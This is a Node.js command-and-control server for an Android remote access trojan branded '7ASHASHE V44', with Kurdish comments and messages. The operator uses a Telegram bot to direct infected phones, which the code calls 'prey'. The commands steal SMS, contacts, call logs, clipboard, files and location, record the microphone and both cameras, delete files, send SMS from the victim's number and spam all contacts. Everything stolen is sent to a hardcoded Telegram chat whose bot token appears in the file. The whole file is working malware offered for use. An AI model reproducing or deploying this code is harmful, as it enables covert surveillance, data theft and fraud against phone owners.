// =====================================================
// 7ASHASHE V44 - ULTIMATE KURDISH RAT
// گەشەپێدەر: 7ASHASHE - وەحشی هاک
// وەشان: 44.0.0 - KURDISH EDITION
// توکن: 8745582802:AAEKDPD6hQSlw7cvFHgBnDdE5-NLf-sgRWU
// چات ئایدی: 5578405082
// پۆرت: 8080
// =====================================================

const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require("axios");

// =====================================================
// 🔐 زانیاری تێلیگرام - 7ASHASHE
// =====================================================
const token = '8745582802:AAEKDPD6hQSlw7cvFHgBnDdE5-NLf-sgRWU';
const chatId = '5578405082';
const address = 'https://www.google.com';

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const appBot = new telegramBot(token, { polling: true });
const appClients = new Map();

const upload = multer();
app.use(bodyParser.json());

let currentUuid = '';
let currentNumber = '';
let currentTitle = '';

// =====================================================
// 🏠 لاپەڕەی سەرەکی
// =====================================================
app.get('/', function (req, res) {
    res.send('<h1 align="center">🔴 7ASHASHE V44 - ULTIMATE KURDISH RAT</h1>');
});

// =====================================================
// 📤 بارکردنی فایل
// =====================================================
app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname;
    appBot.sendDocument(chatId, req.file.buffer, {
            caption: `🔴 **فایلی نوێ لە ${req.headers.model}**`,
            parse_mode: "HTML"
        },
        {
            filename: name,
            contentType: 'application/txt',
        });
    res.send('');
});

// =====================================================
// 📝 ناردنی تێکست
// =====================================================
app.post("/uploadText", (req, res) => {
    appBot.sendMessage(chatId, `🔴 **پەیام لە ${req.headers.model}**\n\n` + req.body['text'], { parse_mode: "HTML" });
    res.send('');
});

// =====================================================
// 📍 ناردنی شوێن
// =====================================================
app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(chatId, req.body['lat'], req.body['lon']);
    appBot.sendMessage(chatId, `🔴 **شوێنی ${req.headers.model}**`, { parse_mode: "HTML" });
    res.send('');
});

// =====================================================
// 🔌 پەیوەندی WebSocket
// =====================================================
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4();
    const model = req.headers.model || 'نەزانراو';
    const battery = req.headers.battery || 'نەزانراو';
    const version = req.headers.version || 'نەزانراو';
    const brightness = req.headers.brightness || 'نەزانراو';
    const provider = req.headers.provider || 'نەزانراو';

    ws.uuid = uuid;
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    });
    
    appBot.sendMessage(chatId,
        `🔴 **ئامێری نوێ پەیوەندی کرد**\n\n` +
        `📱 **مۆدێل:** <b>${model}</b>\n` +
        `🔋 **پاتری:** <b>${battery}</b>\n` +
        `📱 **ئەندرۆید:** <b>${version}</b>\n` +
        `💡 **ڕووناکی:** <b>${brightness}</b>\n` +
        `📡 **پڕۆڤایدەر:** <b>${provider}</b>`,
        { parse_mode: "HTML" }
    );
    
    ws.on('close', function () {
        appBot.sendMessage(chatId,
            `🔴 **ئامێر پەیوەندی پچڕاند**\n\n` +
            `📱 **مۆدێل:** <b>${model}</b>\n` +
            `🔋 **پاتری:** <b>${battery}</b>\n` +
            `📱 **ئەندرۆید:** <b>${version}</b>\n` +
            `💡 **ڕووناکی:** <b>${brightness}</b>\n` +
            `📡 **پڕۆڤایدەر:** <b>${provider}</b>`,
            { parse_mode: "HTML" }
        );
        appClients.delete(ws.uuid);
    });
});

// =====================================================
// 🤖 بۆتی تێلیگرام - فەرمانەکان
// =====================================================
appBot.on('message', (message) => {
    const msgChatId = message.chat.id;
    
    if (message.reply_to_message) {
        // ناردنی SMS
        if (message.reply_to_message.text.includes('🔴 ژمارە تەلەفۆن بنووسە بۆ ناردنی نامە')) {
            currentNumber = message.text;
            appBot.sendMessage(chatId,
                '🔴 **ئێستا پەیامەکە بنووسە**\n\n' +
                'پەیامەکە لە ژمارەی نێچیرەکەوە دەنێردرێت',
                { reply_markup: { force_reply: true } }
            );
        }
        
        // ناردنی SMS
        if (message.reply_to_message.text.includes('🔴 ئێستا پەیامەکە بنووسە')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`);
                }
            });
            currentNumber = '';
            currentUuid = '';
            appBot.sendMessage(chatId,
                '🔴 **فەرمانەکە نێردرا**\n\n' +
                'چاوەڕێی وەڵام بە...',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["🔴 ئامێرەکان"], ["🔴 فەرمانەکان"]],
                        'resize_keyboard': true
                    }
                }
            );
        }

        // ناردنی پەیام بۆ هەموو کۆنتاکتەکان
        if (message.reply_to_message.text.includes('🔴 پەیامەکە بنووسە بۆ ناردن بۆ هەموو کۆنتاکتەکان')) {
            const message_to_all = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${message_to_all}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(chatId,
                '🔴 **فەرمانەکە نێردرا**\n\n' +
                'چاوەڕێی وەڵام بە...',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["🔴 ئامێرەکان"], ["🔴 فەرمانەکان"]],
                        'resize_keyboard': true
                    }
                }
            );
        }

        // وەرگرتنی فایل
        if (message.reply_to_message.text.includes('🔴 ڕێگای فایلەکە بنووسە بۆ وەرگرتن')) {
            const path = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${path}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(chatId,
                '🔴 **فەرمانەکە نێردرا**\n\n' +
                'چاوەڕێی وەڵام بە...',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["🔴 ئامێرەکان"], ["🔴 فەرمانەکان"]],
                        'resize_keyboard': true
                    }
                }
            );
        }

        // سڕینەوەی فایل
        if (message.reply_to_message.text.includes('🔴 ڕێگای فایلەکە بنووسە بۆ سڕینەوە')) {
            const path = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${path}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(chatId,
                '🔴 **فەرمانەکە نێردرا**\n\n' +
                'چاوەڕێی وەڵام بە...',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["🔴 ئامێرەکان"], ["🔴 فەرمانەکان"]],
                        'resize_keyboard': true
                    }
                }
            );
        }

        // تۆمارکردنی دەنگ
        if (message.reply_to_message.text.includes('🔴 ماوەی تۆمارکردن بنووسە (چرکە)')) {
            const duration = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`microphone:${duration}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(chatId,
                '🔴 **فەرمانەکە نێردرا**\n\n' +
                'چاوەڕێی وەڵام بە...',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["🔴 ئامێرەکان"], ["🔴 فەرمانەکان"]],
                        'resize_keyboard': true
                    }
                }
            );
        }

        // تۆمارکردنی کامێرای پشت
        if (message.reply_to_message.text.includes('🔴 ماوەی تۆمارکردنی کامێرای پشت بنووسە')) {
            const duration = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_main:${duration}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(chatId,
                '🔴 **فەرمانەکە نێردرا**\n\n' +
                'چاوەڕێی وەڵام بە...',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["🔴 ئامێرەکان"], ["🔴 فەرمانەکان"]],
                        'resize_keyboard': true
                    }
                }
            );
        }

        // تۆمارکردنی کامێرای پێش
        if (message.reply_to_message.text.includes('🔴 ماوەی تۆمارکردنی کامێرای پێش بنووسە')) {
            const duration = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_selfie:${duration}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(chatId,
                '🔴 **فەرمانەکە نێردرا**\n\n' +
                'چاوەڕێی وەڵام بە...',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["🔴 ئامێرەکان"], ["🔴 فەرمانەکان"]],
                        'resize_keyboard': true
                    }
                }
            );
        }

        // ناردنی Toast
        if (message.reply_to_message.text.includes('🔴 پەیامی Toast بنووسە')) {
            const toastMessage = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`toast:${toastMessage}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(chatId,
                '🔴 **فەرمانەکە نێردرا**\n\n' +
                'چاوەڕێی وەڵام بە...',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["🔴 ئامێرەکان"], ["🔴 فەرمانەکان"]],
                        'resize_keyboard': true
                    }
                }
            );
        }

        // ناردنی ئاگاداری
        if (message.reply_to_message.text.includes('🔴 ناونیشانی ئاگاداری بنووسە')) {
            const notificationMessage = message.text;
            currentTitle = notificationMessage;
            appBot.sendMessage(chatId,
                '🔴 **ئێستا لینکەکە بنووسە**\n\n' +
                'کاتێک نێچیرەکە کرتە لەسەر ئاگادارییەکە دەکات، لینکەکە دەکرێتەوە',
                { reply_markup: { force_reply: true } }
            );
        }

        // لینکی ئاگاداری
        if (message.reply_to_message.text.includes('🔴 ئێستا لینکەکە بنووسە')) {
            const link = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`show_notification:${currentTitle}/${link}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(chatId,
                '🔴 **فەرمانەکە نێردرا**\n\n' +
                'چاوەڕێی وەڵام بە...',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["🔴 ئامێرەکان"], ["🔴 فەرمانەکان"]],
                        'resize_keyboard': true
                    }
                }
            );
        }

        // لێدانی دەنگ
        if (message.reply_to_message.text.includes('🔴 لینکی دەنگەکە بنووسە')) {
            const audioLink = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`play_audio:${audioLink}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(chatId,
                '🔴 **فەرمانەکە نێردرا**\n\n' +
                'چاوەڕێی وەڵام بە...',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["🔴 ئامێرەکان"], ["🔴 فەرمانەکان"]],
                        'resize_keyboard': true
                    }
                }
            );
        }
    }

    // =====================================================
    // فەرمانە سەرەکییەکان
    // =====================================================
    if (chatId == msgChatId) {
        if (message.text == '/start') {
            appBot.sendMessage(chatId,
                '🔴 **7ASHASHE V44 - ULTIMATE KURDISH RAT**\n\n' +
                '✅ **بەخێربێیت، 7ASHASHE!**\n\n' +
                '• ئەگەر ئەپەکە لەسەر ئامێری نێچیر دامەزرابێت، چاوەڕێی پەیوەندی بکە\n\n' +
                '• کاتێک پەیامی پەیوەندیت وەرگرت، ئامێرەکە ئامادەیە بۆ وەرگرتنی فەرمان\n\n' +
                '🔴 **ئامێرەکان** - پیشاندانی ئامێرە پەیوەستکراوەکان\n' +
                '🔴 **فەرمانەکان** - ناردنی فەرمان بۆ ئامێرەکان\n\n' +
                '👑 **Master: 7ASHASHE**',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["🔴 ئامێرەکان"], ["🔴 فەرمانەکان"]],
                        'resize_keyboard': true
                    }
                }
            );
        }

        // پیشاندانی ئامێرەکان
        if (message.text == '🔴 ئامێرەکان') {
            if (appClients.size == 0) {
                appBot.sendMessage(chatId,
                    '🔴 **هیچ ئامێرێک پەیوەست نییە**\n\n' +
                    'دڵنیابە لەوەی ئەپەکە لەسەر ئامێری نێچیر دامەزراوە'
                );
            } else {
                let text = '🔴 **ئامێرە پەیوەستکراوەکان**\n\n';
                appClients.forEach(function (value, key, map) {
                    text += `📱 **مۆدێل:** <b>${value.model}</b>\n` +
                        `🔋 **پاتری:** <b>${value.battery}</b>\n` +
                        `📱 **ئەندرۆید:** <b>${value.version}</b>\n` +
                        `💡 **ڕووناکی:** <b>${value.brightness}</b>\n` +
                        `📡 **پڕۆڤایدەر:** <b>${value.provider}</b>\n` +
                        `🆔 **ئایدی:** <b>${key.substring(0, 8)}...</b>\n\n`;
                });
                appBot.sendMessage(chatId, text, { parse_mode: "HTML" });
            }
        }

        // فەرمانەکان
        if (message.text == '🔴 فەرمانەکان') {
            if (appClients.size == 0) {
                appBot.sendMessage(chatId,
                    '🔴 **هیچ ئامێرێک پەیوەست نییە**\n\n' +
                    'دڵنیابە لەوەی ئەپەکە لەسەر ئامێری نێچیر دامەزراوە'
                );
            } else {
                const deviceListKeyboard = [];
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([{
                        text: value.model,
                        callback_data: 'device:' + key
                    }]);
                });
                appBot.sendMessage(chatId, '🔴 **ئامێرێک هەڵبژێرە بۆ ناردنی فەرمان**', {
                    "reply_markup": {
                        "inline_keyboard": deviceListKeyboard,
                    },
                });
            }
        }
    } else {
        appBot.sendMessage(chatId, '🔴 **ڕێگەپێدان نەدرا**');
    }
});

// =====================================================
// 🔘 کۆدەکانی کلیکی ئینڵاین
// =====================================================
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const commend = data.split(':')[0];
    const uuid = data.split(':')[1];

    if (commend == 'device') {
        appBot.editMessageText(`🔴 **فەرمانەکان بۆ ${appClients.get(uuid).model}**`, {
            width: 10000,
            chat_id: chatId,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '📱 ئەپەکان', callback_data: `apps:${uuid}` },
                        { text: 'ℹ️ زانیاری', callback_data: `device_info:${uuid}` }
                    ],
                    [
                        { text: '📁 وەرگرتنی فایل', callback_data: `file:${uuid}` },
                        { text: '🗑️ سڕینەوەی فایل', callback_data: `delete_file:${uuid}` }
                    ],
                    [
                        { text: '📋 کلیپبۆرد', callback_data: `clipboard:${uuid}` },
                        { text: '🎤 مایکرۆفۆن', callback_data: `microphone:${uuid}` }
                    ],
                    [
                        { text: '📸 کامێرای پشت', callback_data: `camera_main:${uuid}` },
                        { text: '🤳 کامێرای پێش', callback_data: `camera_selfie:${uuid}` }
                    ],
                    [
                        { text: '📍 شوێن', callback_data: `location:${uuid}` },
                        { text: '💬 Toast', callback_data: `toast:${uuid}` }
                    ],
                    [
                        { text: '📞 پەیوەندییەکان', callback_data: `calls:${uuid}` },
                        { text: '👥 کۆنتاکتەکان', callback_data: `contacts:${uuid}` }
                    ],
                    [
                        { text: '📳 لەرزین', callback_data: `vibrate:${uuid}` },
                        { text: '🔔 ئاگاداری', callback_data: `show_notification:${uuid}` }
                    ],
                    [
                        { text: '📨 SMS', callback_data: `messages:${uuid}` },
                        { text: '📤 ناردنی SMS', callback_data: `send_message:${uuid}` }
                    ],
                    [
                        { text: '🎵 لێدانی دەنگ', callback_data: `play_audio:${uuid}` },
                        { text: '⏹️ وەستاندنی دەنگ', callback_data: `stop_audio:${uuid}` }
                    ],
                    [
                        {
                            text: '📢 ناردن بۆ هەموو کۆنتاکتەکان',
                            callback_data: `send_message_to_all:${uuid}`
                        }
                    ],
                ]
            },
            parse_mode: "HTML"
        });
    }

    // فەرمانەکان
    const commands = ['calls', 'contacts', 'messages', 'apps', 'device_info', 'clipboard', 
                     'camera_main', 'camera_selfie', 'location', 'vibrate', 'stop_audio'];

    commands.forEach(cmd => {
        if (commend == cmd) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == uuid) {
                    ws.send(cmd);
                }
            });
            appBot.deleteMessage(chatId, msg.message_id);
            appBot.sendMessage(chatId,
                '🔴 **فەرمان نێردرا**\n\n' +
                'چاوەڕێی وەڵام بە...',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["🔴 ئامێرەکان"], ["🔴 فەرمانەکان"]],
                        'resize_keyboard': true
                    }
                }
            );
        }
    });

    // ناردنی SMS
    if (commend == 'send_message') {
        appBot.deleteMessage(chatId, msg.message_id);
        appBot.sendMessage(chatId,
            '🔴 **ژمارە تەلەفۆن بنووسە بۆ ناردنی نامە**\n\n' +
            'ژمارەکە دەبێت بە فۆرماتی نێودەوڵەتی بێت (مثال: 964**********)',
            { reply_markup: { force_reply: true } }
        );
        currentUuid = uuid;
    }

    // ناردنی پەیام بۆ هەموو کۆنتاکتەکان
    if (commend == 'send_message_to_all') {
        appBot.deleteMessage(chatId, msg.message_id);
        appBot.sendMessage(chatId,
            '🔴 **پەیامەکە بنووسە بۆ ناردن بۆ هەموو کۆنتاکتەکان**\n\n' +
            'پەیامەکە بۆ هەموو کۆنتاکتەکانی نێچیرەکە دەنێردرێت',
            { reply_markup: { force_reply: true } }
        );
        currentUuid = uuid;
    }

    // وەرگرتنی فایل
    if (commend == 'file') {
        appBot.deleteMessage(chatId, msg.message_id);
        appBot.sendMessage(chatId,
            '🔴 **ڕێگای فایلەکە بنووسە بۆ وەرگرتن**\n\n' +
            'نموونە: <b>DCIM/Camera</b> بۆ وەرگرتنی وێنەکان',
            { reply_markup: { force_reply: true }, parse_mode: "HTML" }
        );
        currentUuid = uuid;
    }

    // سڕینەوەی فایل
    if (commend == 'delete_file') {
        appBot.deleteMessage(chatId, msg.message_id);
        appBot.sendMessage(chatId,
            '🔴 **ڕێگای فایلەکە بنووسە بۆ سڕینەوە**\n\n' +
            'نموونە: <b>DCIM/Camera/photo.jpg</b>',
            { reply_markup: { force_reply: true }, parse_mode: "HTML" }
        );
        currentUuid = uuid;
    }

    // تۆمارکردنی دەنگ
    if (commend == 'microphone') {
        appBot.deleteMessage(chatId, msg.message_id);
        appBot.sendMessage(chatId,
            '🔴 **ماوەی تۆمارکردن بنووسە (چرکە)**\n\n' +
            'نموونە: 10 بۆ ١٠ چرکە',
            { reply_markup: { force_reply: true }, parse_mode: "HTML" }
        );
        currentUuid = uuid;
    }

    // ناردنی Toast
    if (commend == 'toast') {
        appBot.deleteMessage(chatId, msg.message_id);
        appBot.sendMessage(chatId,
            '🔴 **پەیامی Toast بنووسە**\n\n' +
            'پەیامێکی کورت کە لەسەر شاشە دەردەکەوێت',
            { reply_markup: { force_reply: true }, parse_mode: "HTML" }
        );
        currentUuid = uuid;
    }

    // ناردنی ئاگاداری
    if (commend == 'show_notification') {
        appBot.deleteMessage(chatId, msg.message_id);
        appBot.sendMessage(chatId,
            '🔴 **ناونیشانی ئاگاداری بنووسە**\n\n' +
            'پەیامەکە وەک ئاگاداری لە شریتی دۆخی ئامێرەکەدا دەردەکەوێت',
            { reply_markup: { force_reply: true }, parse_mode: "HTML" }
        );
        currentUuid = uuid;
    }

    // لێدانی دەنگ
    if (commend == 'play_audio') {
        appBot.deleteMessage(chatId, msg.message_id);
        appBot.sendMessage(chatId,
            '🔴 **لینکی دەنگەکە بنووسە**\n\n' +
            'پێویستە لینکی ڕاستەوخۆ بێت',
            { reply_markup: { force_reply: true }, parse_mode: "HTML" }
        );
        currentUuid = uuid;
    }
});

// =====================================================
// 🔄 پینگ و پاراستنی سێرڤەر
// =====================================================
setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping');
    });
    try {
        axios.get(address).then(r => "");
    } catch (e) {}
}, 5000);

// =====================================================
// 🚀 دەستپێکردنی سێرڤەر (پۆرت 8080)
// =====================================================
const PORT = process.env.PORT || 8080;
appServer.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ 7ASHASHE V44 running on port ${PORT}`);
    console.log(`🌐 http://localhost:${PORT}`);
    console.log(`🔥 ULTIMATE KURDISH RAT - 7ASHASHE`);
    
    appBot.sendMessage(chatId,
        `🔴 **7ASHASHE V44 - ULTIMATE KURDISH RAT**\n\n` +
        `👑 **Master: 7ASHASHE**\n` +
        `📊 وەشان: 44.0.0\n` +
        `🌐 پۆرت: ${PORT}\n` +
        `⏰ کات: ${new Date().toLocaleString('ckb')}\n\n` +
        `🦁 **7ASHASHE**`
    );
});
